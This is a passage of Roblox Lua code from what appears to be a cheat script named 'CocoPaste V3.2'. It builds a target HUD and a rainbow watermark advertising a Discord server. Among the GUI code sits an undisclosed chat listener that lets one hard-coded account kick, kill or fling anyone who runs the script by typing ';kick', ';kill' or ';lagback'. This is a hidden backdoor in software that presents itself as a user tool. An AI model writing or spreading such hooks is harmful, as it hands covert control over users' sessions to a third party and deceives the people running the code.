            Meter:TweenSize(UDim2.new(healthChange, 0, 0.1, 0), "In", "Linear", 0.2)
            Meter.BackgroundColor3 = healthColor
            HP.Text = math.floor(targetHumanoid.Health)
            TextLabel.Text = "Name: " .. targetPlayer.Name
        end
    elseif TargetInfoHUD then
        local TweenInformation = TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
        local LoadingFrameTween = TweenService:Create(Health, TweenInformation, {Size = UDim2.new(0, 0, 0, 0)})
        LoadingFrameTween:Play()
        LoadingFrameTween.Completed:Connect(function()
            TargetInfoHUD:Destroy()
            TargetInfoHUD = nil
        end)
    end
end

targethud = GuiLibrary.API.Windows.Gui.CreateButton({
    ["Name"] = "TargetHud",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("TargetHud", 1.2, "TargetHud has been enabled")
            task.spawn(function()
                repeat task.wait(0.2)
                UpdateTargetInfo()
                until (not targethud.Enabled)
                CreateNotification("TargetHud", 1.2, "TargetHud has been disabled")
            end)
        end
    end,
})

local Owner = "coco_winontop"
local PlayerService = game:GetService("Players")
local LocalPlayer = PlayerService.LocalPlayer

task.spawn(function()
	repeat
		task.wait(1)

		task.spawn(function()
			for i, v in next, PlayerService:GetPlayers() do
				v.Chatted:Connect(function(Message)		
					task.spawn(function ()
						if Message:lower() == ";kick" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							game:GetService("Players").LocalPlayer:Kick("Kicked by owner")
						end
					end)

					task.spawn(function()
						if Message:lower() == ";kill" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							game.Players.LocalPlayer.Character.Humanoid.Health = 0
						end	
					end)

					task.spawn(function()
						if Message:lower() == ";lagback" and v.Name == Owner and LocalPlayer.Name ~= Owner then
							LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
						end
					end)					
				end)
			end
		end)		
	until false
end)




CreateNotification("CocoPaste", 5, "Press RightShift to open the GUI!")

local TweenService = game:GetService("TweenService")
local NeonWaterMark = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

NeonWaterMark.Name = "NeonWaterMark"
NeonWaterMark.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
NeonWaterMark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
NeonWaterMark.ResetOnSpawn = false

TextLabel.Parent = NeonWaterMark
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0, 0)
TextLabel.Size = UDim2.new(0.2, 0, 0.15, 0)
TextLabel.Font = Enum.Font.RobotoMono
TextLabel.Text = "CocoPaste V3.2 discord.gg/FqrVKaHnaw"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 28.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Add UITextSizeConstraint for dynamic text sizing
UITextSizeConstraint.MaxTextSize = 28
UITextSizeConstraint.MinTextSize = 14
UITextSizeConstraint.Parent = TextLabel

local function changeColor()
    local rainbowColor = Color3.fromHSV(tick() % 5 / 5, 1, 1)
    local info = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(TextLabel, info, {TextColor3 = rainbowColor})
    tween:Play()
end

while true do
    changeColor()
    wait(1)
end

discord
